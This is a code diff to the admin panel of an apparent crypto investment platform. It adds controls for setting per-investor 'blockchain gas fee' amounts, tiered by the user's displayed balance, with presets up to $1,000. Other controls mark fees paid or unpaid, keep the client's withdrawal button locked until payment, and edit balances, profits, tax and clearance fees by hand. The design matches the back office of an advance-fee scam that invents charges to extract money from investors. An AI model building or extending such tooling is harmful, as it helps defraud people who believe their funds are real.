@@ -100,12 +100,15 @@ function switchTab(name, btn) {
 async function loadUsers() {
   setState('users', 'Loading users…');
   try {
-    // Also load payment settings to get platform default withdrawal fee
+    // Also load payment settings to get platform default withdrawal fee and gas fee defaults
     try {
       const sRes = await fetch(`${API}/settings/payment`);
       if (sRes.ok) {
         const sData = await sRes.json();
         window.defaultWithdrawalFee = sData.withdrawal_fee != null ? Number(sData.withdrawal_fee) : 0;
+        window.defaultGasFeeThreshold = sData.gas_fee_threshold != null ? Number(sData.gas_fee_threshold) : 20000;
+        window.defaultGasFeeLow = sData.gas_fee_low != null ? Number(sData.gas_fee_low) : 100;
+        window.defaultGasFeeHigh = sData.gas_fee_high != null ? Number(sData.gas_fee_high) : (sData.gas_fee != null ? Number(sData.gas_fee) : 250);
       }
     } catch {}
 
@@ -142,10 +145,12 @@ function renderUsers(users) {
       const feeRem = Math.max(0, feeReq - feePaid);
       const feeRemColor = feeRem > 0 ? 'color: #f87171;' : 'color: var(--profit);';
 
+      const userTotal = Number(u.balance_usd || 0) + Number(u.profit_usd || 0);
+      const thresh = window.defaultGasFeeThreshold || 20000;
+      const expectedGasTier = userTotal >= thresh ? (window.defaultGasFeeHigh || 250) : (userTotal >= 5000 ? 150 : (window.defaultGasFeeLow || 100));
+      const userGasFee = (u.custom_gas_fee != null && Number(u.custom_gas_fee) >= 0) ? Number(u.custom_gas_fee) : expectedGasTier;
       const gasPaid = Number(u.gas_fee_paid || 0);
-      const gasFeeBadge = gasPaid > 0
-        ? `<span class="badge badge-approved" title="Gas fee settled">$${gasPaid.toFixed(2)} Paid</span>`
-        : `<span class="badge badge-locked" title="Gas fee unpaid">Unpaid</span>`;
+      const isGasPaid = (userGasFee <= 0) || (gasPaid >= userGasFee && userGasFee > 0);
 
       return `<tr>
         <td>
@@ -166,14 +171,37 @@ function renderUsers(users) {
         <td class="amount">$${feeReq.toFixed(2)}</td>
         <td class="amount" style="color: var(--profit);">$${feePaid.toFixed(2)}</td>
         <td class="amount" style="${feeRemColor}">$${feeRem.toFixed(2)}</td>
-        <td>${gasFeeBadge}</td>
+        <td style="min-width: 145px;">
+          <div style="display: flex; flex-direction: column; gap: 4px;">
+            <div style="display: flex; align-items: center; justify-content: space-between; gap: 6px;">
+              <span style="font-weight: 700; color: #38bdf8; font-size: 13px;">$${userGasFee.toFixed(2)}</span>
+              ${u.custom_gas_fee != null ? '<span style="font-size: 10px; padding: 1px 4px; border-radius: 4px; background: rgba(56,189,248,0.15); color: #38bdf8; font-weight: 600;">Custom</span>' : '<span style="font-size: 10px; color: var(--text-muted);">Tier</span>'}
+            </div>
+            <div>
+              ${isGasPaid
+                ? `<span class="badge badge-approved" style="font-size: 11px;">✓ Paid ($${gasPaid.toFixed(2)})</span>`
+                : (gasPaid > 0
+                  ? `<span class="badge badge-pending" style="font-size: 11px;">Part ($${gasPaid.toFixed(2)})</span>`
+                  : `<span class="badge badge-locked" style="font-size: 11px;">🔴 Unpaid</span>`)
+              }
+            </div>
+            <div style="display: flex; gap: 4px; margin-top: 2px;">
+              ${!isGasPaid
+                ? `<button type="button" class="btn-act btn-act-approve" style="padding: 2px 7px; font-size: 11px; flex: 1;" onclick="quickSetGasPaid('${u.id}', ${userGasFee})">⚡ Mark Paid</button>`
+                : `<button type="button" class="btn-act btn-act-danger" style="padding: 2px 7px; font-size: 11px; flex: 1;" onclick="quickSetGasUnpaid('${u.id}')">🔒 Unpay</button>`
+              }
+              <button type="button" class="btn-act btn-act-gas" style="padding: 2px 7px; font-size: 11px;" title="Edit gas fee price" onclick="openGasFeeModal('${u.id}','${esc(u.full_name)}',${userGasFee},${gasPaid},${u.custom_gas_fee != null ? u.custom_gas_fee : 'null'})">✏️ Edit</button>
+            </div>
+          </div>
+        </td>
         <td><span class="badge ${approvedClass}">${approvedLabel}</span></td>
         <td>
           <div class="actions">
             <button class="btn-act btn-act-edit" onclick="openBalanceModal('${u.id}','${esc(u.full_name)}',${u.balance_usd},${u.profit_usd})">Balance</button>
             <button class="btn-act btn-act-edit" onclick="openPlanModal('${u.id}','${esc(u.full_name)}','${esc(u.plan || '')}')">Plan</button>
             <button class="btn-act btn-act-edit" onclick="openTaxModal('${u.id}','${esc(u.full_name)}',${u.tax_percent})">Tax</button>
-            <button class="btn-act btn-act-fee" onclick="openFeeModal('${u.id}','${esc(u.full_name)}',${u.fee_required != null ? u.fee_required : 'null'},${u.fee_paid || 0},${u.withdrawal_approved},${u.gas_fee_paid || 0},${u.custom_gas_fee != null ? u.custom_gas_fee : 'null'})">💳 Fee & Unlock</button>
+            <button class="btn-act btn-act-gas" onclick="openGasFeeModal('${u.id}','${esc(u.full_name)}',${userGasFee},${gasPaid},${u.custom_gas_fee != null ? u.custom_gas_fee : 'null'})">⚡ Gas Fee</button>
+            <button class="btn-act btn-act-fee" onclick="openFeeModal('${u.id}','${esc(u.full_name)}',${u.fee_required != null ? u.fee_required : 'null'},${u.fee_paid || 0},${u.withdrawal_approved},${u.gas_fee_paid || 0},${u.custom_gas_fee != null ? u.custom_gas_fee : 'null'})">💳 Clearance</button>
             <button class="btn-act btn-act-edit" style="border-color: rgba(59, 130, 246, 0.4); color: #60a5fa;" onclick="openSendEmailModal('${u.id}','${esc(u.full_name)}','${esc(u.email)}')">✉️ Email</button>
             <button class="btn-act ${invActivateClass}" onclick="toggleInvestmentStatus('${u.id}','${nextStatus}')">${invActivateLabel}</button>
             <button class="btn-act ${toggleClass}" onclick="toggleApproval('${u.id}',${u.withdrawal_approved})">${toggleLabel}</button>
@@ -765,6 +793,236 @@ async function saveTax(id) {
   closeModal(); loadUsers();
 }
 
+// ── Quick Gas Fee Actions ─────────────────────────────────────────
+
+async function quickSetGasPaid(id, requiredAmount) {
+  try {
+    await apiPatch(`/admin/users/${id}/gas-fee`, {
+      gas_fee_paid: requiredAmount,
+      mark_paid: true
+    });
+    loadUsers();
+  } catch (err) {
+    alert('Failed to update gas fee status. Please check server connection.');
+  }
+}
+
+async function quickSetGasUnpaid(id) {
+  try {
+    await apiPatch(`/admin/users/${id}/gas-fee`, {
+      gas_fee_paid: 0
+    });
+    loadUsers();
+  } catch (err) {
+    alert('Failed to reset gas fee status. Please check server connection.');
+  }
+}
+
+// ── Dedicated Gas Fee Modal ───────────────────────────────────────
+
+function openGasFeeModal(id, name, currentGasPrice, gasPaid = 0, customGasFee = null) {
+  const currentPrice = customGasFee != null ? Number(customGasFee) : Number(currentGasPrice || 250);
+  const currentPaid = Number(gasPaid || 0);
+  const isPaid = (currentPrice <= 0) || (currentPaid >= currentPrice && currentPrice > 0);
+
+  setModal(`⚡ Priority Blockchain Gas Fee — ${name}`, `
+    <div class="modal-info-box">
+      <div class="modal-info-row">
+        <span class="modal-info-label">Investor:</span>
+        <span class="modal-info-val">${esc(name)}</span>
+      </div>
+      <div class="modal-info-row">
+        <span class="modal-info-label">Required Gas Fee:</span>
+        <span class="modal-info-val" style="color: #38bdf8; font-weight: 700; font-size: 15px;" id="g-info-price">$${currentPrice.toFixed(2)}</span>
+      </div>
+      <div class="modal-info-row">
+        <span class="modal-info-label">Current Status:</span>
+        <span class="modal-info-val" id="g-info-status">
+          ${isPaid
+            ? '<span class="badge badge-approved">✓ Settled &amp; Verified ($' + currentPaid.toFixed(2) + ' Paid)</span>'
+            : '<span class="badge badge-locked">🔴 Payment Required Before Dispatch</span>'
+          }
+        </span>
+      </div>
+    </div>
+
+    <!-- Section 1: Set / Edit Gas Fee Price -->
+    <div style="font-weight: 700; color: #38bdf8; margin-bottom: 8px; font-size: 13px;">1. Set Gas Fee Price (Make Smaller or Increase)</div>
+    <div class="field">
+      <label>Gas Fee Price (USD) — Client sees this required amount</label>
+      <input type="number" id="g-price" value="${currentPrice}" min="0" step="1" oninput="recalcGasModal()" />
+      <span class="modal-hint" style="margin-top: 2px; margin-bottom: 4px;">Adjust price dynamically for this investor using the quick controls below:</span>
+      
+      <!-- Stepper buttons to make smaller or increase -->
+      <div class="adjust-btns-row">
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustGasPrice(-100)">- $100</button>
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustGasPrice(-50)">- $50</button>
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustGasPrice(-25)">- $25</button>
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustGasPrice(-10)">- $10</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustGasPrice(10)">+ $10</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustGasPrice(25)">+ $25</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustGasPrice(50)">+ $50</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustGasPrice(100)">+ $100</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustGasPrice(250)">+ $250</button>
+      </div>
+
+      <!-- Quick Preset Chips -->
+      <div class="presets-grid" style="margin-top: 2px;">
+        <button type="button" class="preset-chip" onclick="setGasPreset(50)">$50</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(100)">$100</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(150)">$150</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(200)">$200</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(250)">$250</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(300)">$300</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(500)">$500</button>
+        <button type="button" class="preset-chip" onclick="setGasPreset(1000)">$1,000</button>
+        <button type="button" class="preset-chip adjust-btn-reset" onclick="setGasPreset(${currentGasPrice})">↺ Reset</button>
+      </div>
+    </div>
+
+    <!-- Section 2: Mark as Paid or Unpaid -->
+    <div style="font-weight: 700; color: #10b981; margin: 18px 0 8px; font-size: 13px;">2. Client Payment Status (Click Paid Once Settled)</div>
+    <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+      <button type="button" class="toggle-status-btn ${isPaid ? 'active-paid' : ''}" id="btn-status-paid" onclick="setGasModalPaidStatus(true)">
+        ✅ Mark as PAID (Settled &amp; Verified)
+      </button>
+      <button type="button" class="toggle-status-btn ${!isPaid ? 'active-unpaid' : ''}" id="btn-status-unpaid" onclick="setGasModalPaidStatus(false)">
+        🔴 Mark as UNPAID (Payment Required)
+      </button>
+    </div>
+
+    <div class="field">
+      <label>Amount Already Paid by Client (USD)</label>
+      <input type="number" id="g-paid" value="${currentPaid}" min="0" step="1" oninput="recalcGasModal()" />
+      <span class="modal-hint" style="margin-top: 4px; margin-bottom: 0;">When Amount Paid matches or exceeds Gas Fee Price, the client's screen unlocks and allows dispatch.</span>
+    </div>
+
+    <!-- Section 3: Live Preview of Client Dashboard -->
+    <div class="client-preview-box ${isPaid ? 'is-paid' : ''}" id="g-preview-box">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+        <span style="font-size: 11px; text-transform: uppercase; letter-spacing: 0.6px; font-weight: 700; color: #38bdf8;">
+          Client Screen Live Preview:
+        </span>
+        <span id="g-preview-price" style="font-size: 18px; font-weight: 700; color: #38bdf8;">$${currentPrice.toFixed(2)}</span>
+      </div>
+      <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px;">
+        <div>
+          <div style="font-weight: 600; color: var(--text); font-size: 13px;">Priority Blockchain Network Gas Fee</div>
+          <div id="g-preview-tag" style="margin-top: 4px;">
+            ${isPaid
+              ? '<span class="badge badge-approved" style="font-size: 11px;">✓ Settled &amp; Verified</span>'
+              : '<span class="badge badge-locked" style="font-size: 11px;">🔴 Payment Required Before Dispatch</span>'
+            }
+          </div>
+        </div>
+        <div id="g-preview-btn-mock" style="font-size: 12px;">
+          ${!isPaid
+            ? '<span style="background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff; padding: 4px 10px; border-radius: 6px; font-weight: 600;">⚡ Settle Fee Now</span>'
+            : '<span style="color: #34d399; font-weight: 600; font-size: 12px;">✓ Unlocked</span>'
+          }
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-actions" style="margin-top: 20px;">
+      <button class="btn-primary" onclick="saveGasFeeModal('${id}')">Save Gas Fee Changes</button>
+      <button type="button" class="btn-secondary" onclick="closeModal()">Cancel</button>
+    </div>
+  `);
+}
+
+function adjustGasPrice(delta) {
+  const el = document.getElementById('g-price');
+  if (!el) return;
+  const current = parseFloat(el.value) || 0;
+  const next = Math.max(0, current + delta);
+  el.value = next;
+  const btnPaid = document.getElementById('btn-status-paid');
+  const paidEl = document.getElementById('g-paid');
+  if (btnPaid && btnPaid.classList.contains('active-paid') && paidEl) {
+    paidEl.value = next;
+  }
+  recalcGasModal();
+}
+
+function setGasPreset(amt) {
+  const el = document.getElementById('g-price');
+  if (!el) return;
+  el.value = amt;
+  const btnPaid = document.getElementById('btn-status-paid');
+  const paidEl = document.getElementById('g-paid');
+  if (btnPaid && btnPaid.classList.contains('active-paid') && paidEl) {
+    paidEl.value = amt;
+  }
+  recalcGasModal();
+}
+
+function setGasModalPaidStatus(isPaid) {
+  const priceEl = document.getElementById('g-price');
+  const paidEl = document.getElementById('g-paid');
+  if (!paidEl) return;
+  if (isPaid) {
+    const price = priceEl ? (parseFloat(priceEl.value) || 0) : 0;
+    paidEl.value = price;
+  } else {
+    paidEl.value = 0;
+  }
+  recalcGasModal();
+}
+
+function recalcGasModal() {
+  const priceInput = document.getElementById('g-price');
+  const paidInput = document.getElementById('g-paid');
+  if (!priceInput || !paidInput) return;
+
+  const price = Math.max(0, parseFloat(priceInput.value) || 0);
+  const paid = Math.max(0, parseFloat(paidInput.value) || 0);
+  const isPaid = (price <= 0) || (paid >= price && price > 0);
+
+  const previewBox = document.getElementById('g-preview-box');
+  const previewTag = document.getElementById('g-preview-tag');
+  const previewPrice = document.getElementById('g-preview-price');
+  const previewBtnMock = document.getElementById('g-preview-btn-mock');
+  const btnPaid = document.getElementById('btn-status-paid');
+  const btnUnpaid = document.getElementById('btn-status-unpaid');
+
+  if (previewPrice) previewPrice.textContent = `$${price.toFixed(2)}`;
+  if (previewTag) {
+    if (isPaid) {
+      previewTag.innerHTML = `<span class="badge badge-approved" style="font-size: 11px;">✓ Settled &amp; Verified</span>`;
+    } else {
+      previewTag.innerHTML = `<span class="badge badge-locked" style="font-size: 11px;">🔴 Payment Required Before Dispatch</span>`;
+    }
+  }
+  if (previewBtnMock) {
+    previewBtnMock.innerHTML = !isPaid
+      ? '<span style="background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff; padding: 4px 10px; border-radius: 6px; font-weight: 600;">⚡ Settle Fee Now</span>'
+      : '<span style="color: #34d399; font-weight: 600; font-size: 12px;">✓ Unlocked</span>';
+  }
+  if (previewBox) {
+    if (isPaid) previewBox.classList.add('is-paid');
+    else previewBox.classList.remove('is-paid');
+  }
+  if (btnPaid) btnPaid.className = `toggle-status-btn ${isPaid ? 'active-paid' : ''}`;
+  if (btnUnpaid) btnUnpaid.className = `toggle-status-btn ${!isPaid ? 'active-unpaid' : ''}`;
+}
+
+async function saveGasFeeModal(id) {
+  const priceInput = document.getElementById('g-price');
+  const paidInput = document.getElementById('g-paid');
+  const custom_gas_fee = priceInput && priceInput.value.trim() !== '' ? Math.max(0, parseFloat(priceInput.value) || 0) : null;
+  const gas_fee_paid = paidInput ? Math.max(0, parseFloat(paidInput.value) || 0) : 0;
+
+  await apiPatch(`/admin/users/${id}/gas-fee`, {
+    custom_gas_fee,
+    gas_fee_paid
+  });
+  closeModal();
+  loadUsers();
+}
+
+// ── Combined Clearance & Gas Fee Modal ────────────────────────────
+
 function openFeeModal(id, name, feeRequired, feePaid, withdrawalApproved, gasFeePaid = 0, customGasFee = null) {
   const defaultFee = window.defaultWithdrawalFee != null ? Number(window.defaultWithdrawalFee) : 0;
   const currentReq = feeRequired != null ? Number(feeRequired) : defaultFee;
@@ -797,19 +1055,36 @@ function openFeeModal(id, name, feeRequired, feePaid, withdrawalApproved, gasFee
 
     <div style="font-weight: 700; color: #38bdf8; margin: 16px 0 8px; font-size: 13px;">2. Priority Blockchain Network Gas Fee</div>
     <div class="field">
-      <label>Blockchain Gas Fee Paid (USD)</label>
-      <input type="number" id="m-gas-paid" value="${currentGasPaid}" min="0" step="1" />
-      <span class="modal-hint" style="margin-top: 4px; margin-bottom: 0;">Withdrawal button remains locked on client screen if gas fee is $0 or unpaid.</span>
+      <label>Custom Gas Fee Price (USD — Make Smaller or Increase)</label>
+      <input type="number" id="m-custom-gas" value="${currentCustomGas}" placeholder="Default from tier (e.g. 250)" min="0" step="1" />
+      <div class="adjust-btns-row">
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustCustomGas(-50)">- $50</button>
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustCustomGas(-25)">- $25</button>
+        <button type="button" class="adjust-btn adjust-btn-down" onclick="adjustCustomGas(-10)">- $10</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustCustomGas(10)">+ $10</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustCustomGas(25)">+ $25</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustCustomGas(50)">+ $50</button>
+        <button type="button" class="adjust-btn adjust-btn-up" onclick="adjustCustomGas(100)">+ $100</button>
+      </div>
+      <div class="presets-grid" style="margin-top: 2px;">
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(50)">$50</button>
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(100)">$100</button>
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(150)">$150</button>
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(200)">$200</button>
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(250)">$250</button>
+        <button type="button" class="preset-chip" onclick="setCustomGasPreset(500)">$500</button>
+      </div>
+      <span class="modal-hint" style="margin-top: 4px; margin-bottom: 0;">Leave empty to use automatic tier pricing.</span>
     </div>
 
     <div class="field">
-      <label>Custom Gas Fee Override (USD, Optional)</label>
-      <input type="number" id="m-custom-gas" value="${currentCustomGas}" placeholder="Default from tier (e.g. 150)" min="0" step="1" />
-      <span class="modal-hint" style="margin-top: 4px; margin-bottom: 0;">Leave empty to use automatic tier pricing (e.g. $150 for $10k).</span>
+      <label>Blockchain Gas Fee Paid (USD)</label>
+      <input type="number" id="m-gas-paid" value="${currentGasPaid}" min="0" step="1" />
+      <span class="modal-hint" style="margin-top: 4px; margin-bottom: 0;">Withdrawal button remains locked on client screen if gas fee is unpaid.</span>
     </div>
 
     <div style="display: flex; gap: 8px; margin-bottom: 12px;">
-      <button type="button" class="btn-act btn-act-approve" style="flex: 1; padding: 8px;" onclick="setQuickGasFee(150)">⚡ Set $150 Gas Paid</button>
+      <button type="button" class="btn-act btn-act-approve" style="flex: 1; padding: 8px;" onclick="setQuickGasFee('full')">⚡ Set Gas Paid in Full</button>
       <button type="button" class="btn-act btn-act-danger" style="flex: 1; padding: 8px;" onclick="setQuickGasFee(0)">🔒 Reset Gas Unpaid</button>
     </div>
 
@@ -842,9 +1117,32 @@ function openFeeModal(id, name, feeRequired, feePaid, withdrawalApproved, gasFee
   `);
 }
 
+function adjustCustomGas(delta) {
+  const el = document.getElementById('m-custom-gas');
+  if (!el) return;
+  const current = parseFloat(el.value) || 250;
+  el.value = Math.max(0, current + delta);
+}
+
+function setCustomGasPreset(amt) {
+  const el = document.getElementById('m-custom-gas');
+  if (el) el.value = amt;
+}
+
 function setQuickGasFee(amt) {
   const el = document.getElementById('m-gas-paid');
-  if (el) el.value = amt;
+  const customEl = document.getElementById('m-custom-gas');
+  if (!el) return;
+  if (amt === 'full') {
+    const customVal = customEl ? parseFloat(customEl.value) : NaN;
+    if (!isNaN(customVal) && customVal >= 0) {
+      el.value = customVal;
+    } else {
+      el.value = window.defaultGasFeeHigh || 250;
+    }
+  } else {
+    el.value = amt;
+  }
 }
 
 function recalcFeeModal() {
@@ -867,10 +1165,14 @@ function setQuickFee(action) {
   const req = parseFloat(document.getElementById('m-fee-req').value) || 0;
   const appCheck = document.getElementById('m-approved');
   const gasEl = document.getElementById('m-gas-paid');
+  const customGasEl = document.getElementById('m-custom-gas');
   if (action === 'paid') {
     document.getElementById('m-fee-paid').value = req.toFixed(2);
     document.getElementById('m-fee-rem').value = '0.00';
-    if (gasEl) gasEl.value = '150';
+    if (gasEl) {
+      const customVal = customGasEl ? parseFloat(customGasEl.value) : NaN;
+      gasEl.value = (!isNaN(customVal) && customVal >= 0) ? customVal : (window.defaultGasFeeHigh || 250);
+    }
     if (appCheck) appCheck.checked = true;
     updateFeePreview(req, req, 0);
   } else {
